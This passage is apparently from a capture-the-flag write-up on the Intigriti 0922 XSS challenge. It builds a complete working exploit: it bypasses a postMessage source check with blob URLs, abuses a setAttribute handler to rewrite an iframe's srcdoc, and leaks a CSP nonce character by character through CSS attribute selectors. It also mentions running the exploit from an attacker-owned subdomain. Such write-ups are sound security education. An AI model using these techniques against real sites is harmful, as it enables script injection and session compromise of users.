<iframe onload=run() src="https://challenge-0922.intigriti.io/challenge/"></iframe>
<script>
  run = e => {
    burl = URL.createObjectURL(new Blob(['<script>alert(document.domain)<\/script>'], {type : 'text/html'}))
    frames[0][0].location = burl 
  }
</script>
```

Side note: Javasript cannot hold the string `</script>` in a variable. One will
have to escape the slash with a backslash `<\/script`> or split the string up
`'<' + '/script>'`. If this is not done it will break the parser.
See for yourself https://editor.43z.one/bgn21
```
<script>
  let myVar = `</script>`
</script>
```
`Uncaught SyntaxError: '' literal not terminated before end of script i:2:15`


Anyway continuing. Will it work, will we finally see a popup? No. Chrome will show
an error. `Ignored call to 'alert()'. The document is sandboxed, and the 'allow-modals' keyword is not set.`

Because the `iframe` from `index.php` has the attribute set with `sandbox="allow-scripts allow-same-origin"`
it does only allow whats explicitly mentioned there. For modals like `alert()`, `prompt()`
or `print()` it would need the extra attribute of  'allow-modals'. Let's just quickly
change the `alert` to an `console.log` and see what `document.domain` says.
https://editor.43z.one/c8q7m
```
<iframe onload=run() src="https://challenge-0922.intigriti.io/challenge/"></iframe>
<script>
  run = e => {
    burl = URL.createObjectURL(new Blob(['<script>console.log(document.domain)<\/script>'], {type : 'text/html'}))
    frames[0][0].location = burl 
  }
</script>
```
The console shows `editor.43z.one` this means we are not in the context of the challenge
which would be `challenge-0922.intigriti.io`. This seems logical as we created the blob URL in the context
of `editor.43z.one` so that's what it's context will be.
But the point of this challenge is to proof to have control over `challenge-0922.intigriti.io` not some random
3rd party domain. So we are not done yet. 

The blob thing is still cool. Can it help us to trick
```
window.addEventListener('message', e => {
  if (e.source !== document.querySelector('#ball').contentWindow){
    e.stopImmediatePropagation();
  }
});
```
and finally get to the `setAttribute`, `removeAttribute` part? Well, we could load into the 
`<iframe>`(`magic.php` with the id of `ball`) a blob URL which we have full 
control over. And from that "blobbed" file we will then
send a `postMessage` to the parent. This way `e.source` will be equal to 
`document.querySelector('#ball').contentWindow`

Like this https://editor.43z.one/t39xj
```
<iframe onload=run() src="https://challenge-0922.intigriti.io/challenge/"></iframe>
<script>
  run = e => {
    burl = URL.createObjectURL(new Blob([`
      <script>
        parent.postMessage('hello!', '*') 
      <\/script>
    `], {type : 'text/html'}))
    frames[0][0].location = burl 
  }
</script>
```
If we check the console we will see the `hello!` printed. This comes directly from the
default case of the `switch` statement we wanted to get at. That also means we successfully tricked
the if clause.
```
if (e.source !== document.querySelector('#ball').contentWindow){
  e.stopImmediatePropagation();
}
```
and got until here

```
addEventListener('message', e => {
  switch(e.data.action){
    ...
    default:
      console.log(e.data); // <------- We've come so far
  }
});
```
It took long to get there but what's next? Now that we could finally make
use of the `setAttribute` function call by just sending the correct object
with `postMessage`.

We came across two interesting attributes of `<iframe>`, `src` and `srcdoc`.
The cool thing about changing the `srcdoc` is that it doesn't switch context.
The `iframe` keeps having access to the parent. It's not really considered a new
domain so it doesn't break SameOriginPolicy. See for yourself https://editor.43z.one/mgwn6

```
<script>
  var i = "i'm a global variable"
</script>

<iframe srcdoc="<script>alert(parent.i)</script>"></iframe>
```
That's because it never changed domain. If we run this 

```
<iframe srcdoc="<script>alert(document.domain)</script>"></iframe>
```
from https://editor.43z.one/244ck it would show `editor.43z.one`.

This is perfect. We will use this fact about `srcdoc` to our advantage.
We will craft a message that triggers this part of the code
```
  case 'set':
    [...document.querySelectorAll(e.data.element)].forEach(s => s.setAttribute(e.data.attr, e.data.value));
    break;
```
And change the `srcdoc` of the `<iframe>`. 
Just a quick reminder, at that point the iframe will no longer hold the `magic.php` 
but our blobed URL which send the command the change the `srcdoc` in the first place.

https://editor.43z.one/bh2ba
```
<iframe onload=run() src="https://challenge-0922.intigriti.io/challenge/"></iframe>
<script>
  run = e => {
    burl = URL.createObjectURL(new Blob([`
      <script>
        parent.postMessage({
          element: '#ball',
          action: 'set',
          attr: 'srcdoc',
          value: '<script>alert(document.domain)</'+'script>'
        }, '*') 
      <\/script>
    `], {type : 'text/html'}))
    frames[0][0].location = burl 
  }
</script>
```
But what is that. Another error!
```
Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'nonce-fd66e11600987aa40022b9942292461'". Either the 'unsafe-inline' keyword, a hash ('sha256-X6WoVv8sUlFXk0r+MI/R+p2PsbD1k74Z+jLIpYAjIgE='), or a nonce ('nonce-...') is required to enable inline execution.
```
We forgot! As changing the `srcdoc` does not change the context, the CSP of `challenge-0922.intigriti.io`
is still is enforced! That means the `script` block that holds our payload will need
to have the correct `nonce` to be allowed to execute. 
The same nonce that the CSP sets in the `<meta>` tag with `...script-src 'nonce-fd66e11600987aa40022b9942292461';...`.

But how will our code get it's hand on the `nonce`? 

Remember we saw it base64 encoded in the trace output of the api endpoint?
Let's start there. What if we just request it by making a regular GET request in
javascript from a 3rd party domain like https://editor.43z.one/w4jss
```
<script>
fetch("https://challenge-0922.intigriti.io/challenge/api.php?question=0")
  .then(r => r.text())
  .then(console.log)
</script>
```
But this time the output is different and shorter then if when we opened `https://challenge-0922.intigriti.io/challenge/api.php?question=0`
in the browser.

```
## Exception 'Question not found'

#0 /dev/urandom(1388934387): setQuestion('"0"')
#1 /dev/urandom(1218692528): initAnonConfig('5n1kq06kq0u4s7a399qqdcqnqh', 'W10=')
#2 /dev/urandom(939716205): initAstralBall('eyJhbnN3ZXJzIjpbIkl0IGlzIGNlcnRhaW4iLCJXaXRob3V0IGEgZG91YnQiLCJEZWZpbml0ZWx5IiwiTW9zdCBsaWtlbHkiLCJPdXRsb29rIGdvb2QiLCJZZXMhIiwiVHJ5IGFnYWluIiwiUmVwbHkgaGF6eSIsIkNhbid0IHByZWRpY3QiLCJObyEiLCJVbmxpa2VseSIsIlNvdXJjZXMgc2F5IG5vIiwiVmVyeSBkb3VidGZ1bCJdfQ==', '"0"')
#3 /var/www/html/api.php(18): require_once('/dev/urandom')
```

Before we got the `csp` from the base64 encoded data from the second parameter of `initAnonConfig`.
But now it just shows `W10=` which is base64 decoded for `[]`. Just an empty array.
Looks like the `csp` or better the full javascript object was bound to a PHP session cookie.
Because by default `fetch()` does not include cookies in the request. That's why
wee see 2 different outputs. 

But according to the documentation of fetch it should send the correct cookies if
we provide the object `{credentials: 'include'}` to it's function call. So let's do 
it.

```
<script>
fetch("https://challenge-0922.intigriti.io/challenge/api.php?question=0", {
  credentials: 'include'
})
  .then(r => r.text())
  .then(console.log)
</script>
```
Which will give you following error in the console
```
Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at https://challenge-0922.intigriti.io/challenge/api.php?question=0. (Reason: expected ‘true’ in CORS header ‘Access-Control-Allow-Credentials’).
```
Again we are getting blocked by the SOP. The server does not set a specific response header.
The browser does not allow us to read the response now. What a bummer!

NOTE: FROM HERE ON THE SOLUTION TO THE CHALLENGE WILL DIFFER FROM OTHERS WHO SOLVED IT.
THERE IS A SERVER BUG WE MISSED, IN PARSING THE ORIGIN HEADER. THE SERVER WILL SET THE 
NEEDED RESPONSE HEADER IF FOR EXAMPLE THE REQUEST WAS MADE FROM 
`challenge-0922.intigriti.io.ATTACKER.COM`. THIS MEANS THE EXPLOIT JUST HAS TO 
BE RUN FROM A SUBDOMAIN `challenge-0922.intigriti.io` WHICH WE WOULD CREATE
ON ANY DOMAIN WE OWN. DOESN'T HAVE TO BE ATTACKER.COM. CAN BE ANYTHING.

As requesting the api didn't work as we liked, what else is there left? 
The `nonce` is obviously reflected in the page `index.php` a few times. 
Once in the actual `<meta>` tag and two times as attribute of `<script>` tags. 

We could use a CSS selector trick with the `document.querySelectorAll` from

```
case 'set':
  [...document.querySelectorAll(e.data.element)].forEach(s => s.setAttribute(e.data.attr, e.data.value));
  break;
```
and extract the nonce one character at a time. Check if the attribute starts with some
value and go on from there `[attribute^=value]`.

Let's look at this example.

```
<script nonce="bcdef"></script>
<script>
  console.log(document.querySelectorAll('script[nonce^="a"]'))
</script>
```
This would log an empty array as there is no `script` with a attribute `nonce`
that starts with `a`. But we can iterate it.
```
<script nonce="bcdef"></script>
<script>
  console.log(document.querySelectorAll('script[nonce^="b"]'))   // finds script tag
  console.log(document.querySelectorAll('script[nonce^="ba"]'))  // empty array
  console.log(document.querySelectorAll('script[nonce^="bb"]'))  // empty array
  console.log(document.querySelectorAll('script[nonce^="bc"]'))  // finds script tag
  console.log(document.querySelectorAll('script[nonce^="bca"]')) // empty array
  console.log(document.querySelectorAll('script[nonce^="bcb"]')) // empty array
  console.log(document.querySelectorAll('script[nonce^="bcc"]')) // empty array
  console.log(document.querySelectorAll('script[nonce^="bcd"]')) // finds script tag
</script>
```
Great! Only need to guess one character at a time. Which makes this kind
of soft "bruteforce" very quick.

We will send these actions from our blobbed script to `index.php`.
But how would the script know if a nonce matched. We need some way of 
communicating back to the `iframe` that what we just sent was correct.

So we can keep building and sending other nonces to try. Whatever this mechanism
is it can only involve running `s.setAttribute()`. Because that's all we can utilize.

And we wouldn't want to change an attribute of the `script` tag but of the `iframe`
tag. From inside the `iframe` tag we may have the option to listen to changes
of attributes that are set to it on the ouside.

This means we don't want the `documentQuerySelector` to return the `script` tag
but the `iframe` tag. We will get it by combining multiple selectors like the 
`~` (sibling combinator) and `>` (child combinator). 
```
script[nonce^="bcda"]~div>div>iframe
```
Side note: Here is a fun game to learn about CSS selectors https://flukeout.github.io/.


Here are some ideas how to communicate back to the `iframe` via attributes.

  Changing the hash portion of the URL of the `iframe`.
  Hash changes not result in reloading of a page. 
  Add an `onhashchange` event hander listening insinde of `iframe`. 

  Changing the `<iframe>`'s `name` attribute.
  Inside create a function that periodically checks
  if the variable `window.name` changed.

  Change the `width` (or `height`) attribute of the
  `<iframe>` and inside listen to the `onresize` event. Or poll it's own `innerHeight`.
  Then maybe use some kind of code to represent a `nonce` like `a5c2` as an integer.
  Only integers can be used to set `width`, `height`.

  Change the `src` of the `iframe`. Listen inside to `onbeforeuload` event.
  This will destroy the `iframe` though because it's being redirected somewhere
  else. But a few commands should be able to run before the code itself vanishes.

After a lot of experimenting we will come to the conclusion that the `name` method
works but only in firefox. The `hash` and `resize` trick don't seem to work in any browser
in this particular case. And we are left with unloading the `iframe`. We can only
change it's `src` to `https://challenge-0922.intigriti.io`. The only thing
allowed by the CSP except `blob:`.

The unloading of the `iframe` complicates things further as we will not be able
to keep a state of the soft "bruteforced" nonce inside of it. Because it will
be destroyed, again we instructed it to be moved to another domain.

In order to store the 'nonce' somewhere else we will send it away. We will
`postMessage` it ouf of the `iframe` to the `top`. This is the code that changed
the location of the iframe in the iframe.

Here a graphical overview of the process. First the state when everything starts.
```
editor.43z.one/1337
+------------------------------------------------------------+
|  challenge-0922.intigriti.com/challenge/index.php          |
|  +------------------------------------------------------+  |
|  |  challenge-0922.intigriti.com/challenge/magic.php    |  |
|  |  +------------------------------------------------+  |  |
|  |  |                                                |  |  |
|  |  |                                                |  |  |
|  |  +------------------------------------------------+  |  |
|  +------------------------------------------------------+  |
+------------------------------------------------------------+

```
Then from `editor.43z.one/1337` we will change the most inner frame
to a blob with our code in it.
```
                                                           change to blob
                                                                +
                                                                |
 editor.43z.one/1337                                            |
+-----------------------------------------------------------------------+
|                                                               |       |
|   challenge-0922.intigriti.com/challenge/index.php            |       |
|  +-----------------------------------------------------------------+  |
|  |                                                            |    |  |
|  |  blob:editor.43z.one/asdf-wf92fg-gew32-fd302-wfw0   <------+    |  |
|  |  +------------------------------------------------+             |  |
|  |  |                                                |             |  |
|  |  +------------------------------------------------+             |  |
|  +-----------------------------------------------------------------+  |
+-----------------------------------------------------------------------+
```
The blob code starts working.
```
 editor.43z.one/1337
+---------------------------------------------------------------------+
|                                                                     |
|   challenge-0922.intigriti.com/challenge/index.php                  |
|  +---------------------------------------------------------------+  |
|  |                                                               |  |
|  |  blob:editor.43z.one/asdf-wf92fg-gew32-fd302-wfw0             |  |
|  |  +------------------------------------------------+           |  |
|  |  |                                                |           |  |
|  |  |                                                |           |  |
|  |  |   code sends new iteration of nonce            |           |  |
|  |  |   every 100ms to parent via postMessage +------------->    |  |
|  |  |                                                |           |  |
|  |  +------------------------------------------------+           |  |
|  +---------------------------------------------------------------+  |
+---------------------------------------------------------------------+
```
On every message `index.php` receives it does the `document.querySelector`
call which includes the sent nonce.
```
  editor.43z.one/1337
+----------------------------------------------------------------------------------------+
|                                                                                        |
|   challenge-0922.intigriti.com/challenge/index.php                                     |
|  +--------------------------------------------------------------------------+          |
|  |                                                                          |          |
|  |  blob:editor.43z.one/asdf-wf92fg-gew32-fd302-wfw0  <---+                 |          |
|  |  +------------------------------------------------+    |                 |          |
|  |  |                                                |    |                 |          |
|  |  |                                                |    +                 |          |
|  |  |   code detects beforeunload event              | when nonce matches it|          |
|  |  |   sends the last nonce it sent to parent       | will set the src     |          |
|  |  |   now to top                                   | of inner iframe to   |          |
|  |  |      +                                         | challenge-0922.intigriti.com    |
|  |  |      |                                         |                      |          |
|  |  |      |                                         |                      |          |
|  |  +------------------------------------------------+                      |          |
|  |         |                                                                |          |
|  +--------------------------------------------------------------------------+          |
|            |                                                                           |
|            v                                                                           |
+----------------------------------------------------------------------------------------+
```
The top has now the first character of the nonce. And the whole process
starts again. But this time the blob code starts the iteration from with the new
nonce that just matched.

We will do this again and again and build up the nonce character by character.
It's tricky to detect the when we got the full nonce because it has not a fixed
length. It can be from 29 up to 32 characters long. We will have to make use
of some timeout counter and simply define that if we don't get a message in the
`top` from the blob in 2 seconds it means we already have the full nonce.

And when that happens we can finally do what failed before. Create a new blob,
one last time, that sends the 'set' message which changes the 'srcdoc' of the iframe.
But this time we got the nonce to make the Content Security Policy happy.

```
<iframe onload=stage1() src="https://challenge-0922.intigriti.io/challenge/"></iframe>
<script>
  onmessage = e => {
    // here detecting the progress of the nonce
    if(nonce fully extracted){
      stage2(nonce)
    }
  }
  stage1 = e => {
    // here the nonce exfiltration stuff
  }

  stage2 = nonce => {
    burl = URL.createObjectURL(new Blob([`
      <script>
        parent.postMessage({
          element: '#ball',
          action: 'set',
          attr: 'srcdoc',
          // we have to use parent.alert because iframe 
          // has sandbox value set and does not allow modals
          // alternatively we could make use of `removeAttribute` to delete it
          value: '<script nonce=${nonce}>parent.alert(document.domain)</'+'script>'
        }, '*') 
      <\/script>
    `], {type : 'text/html'}))
    frames[0][0].location = burl 
  }
</script>
```
And here is the final exploit with all the glue code added to make it actually work.
https://editor.43z.one/j91ak/i check the console to see progress
```
<iframe onload="stage1('')" src="https://challenge-0922.intigriti.io/challenge/"></iframe>

<script>
  const sleepTime = 100
  finished = null
  listener = e => {
    if(!e.data.length) return

    clearTimeout(finished)
    nonce=e.data

    finished = setTimeout(_=>{
      console.log('probabbly finished with', nonce)
      stage2(nonce)
      removeEventListener('message', listener)
    }, sleepTime*17)

    stage1(nonce)

  }
  addEventListener('message', listener)

  genblob = content => {
    b = new Blob([`<script>${content}<\/script>`],{type: 'text/html'})
    return URL.createObjectURL(b)
  }

  stage1 = nonce => {
    frames[0][0].location = genblob(`
      sleep = ms => new Promise(r => setTimeout(r, ms))
      checkNonce=null

      listener = e =>{
        top.postMessage(checkNonce+'', '*')
        removeEventListener('beforeunload', listener)
      }
      addEventListener('beforeunload', listener)

      iteratenonce = async (partialNonce) => {
        console.log('iterating nonce starting with','${nonce}')
        chars = '0123456789abcdef'.split('')
        for(ix=0; ix<chars.length;ix++){
          checkNonce = partialNonce+chars[ix]
          action = {
            element: 'script[nonce^="'+checkNonce+'"]~div>div>iframe',
            action: 'set',
            attr: 'src',
            value: 'https://challenge-0922.intigriti.io'
          }
          parent.postMessage(action, '*')
          console.log('checking', checkNonce)
          await new Promise(r => setTimeout(r, ${sleepTime}))
        }
      }
      iteratenonce('${nonce}')
    `)
  }

  stage2 = nonce => {
    console.log('send script to pop with nonce', nonce)
    frames[0][0].location = genblob(`
      parent.postMessage({
        element: '#ball',
        action: 'set',
        attr: 'srcdoc',
        value: '<script nonce="${nonce}">parent.alert(document.domain)<\\/script>'
      }, '*')
    `)
  }
</script>
```

This was a long journey! You can shoot me a message [@h43z](https://twitter.com/h43z) or open an github issue if 
you have any question.

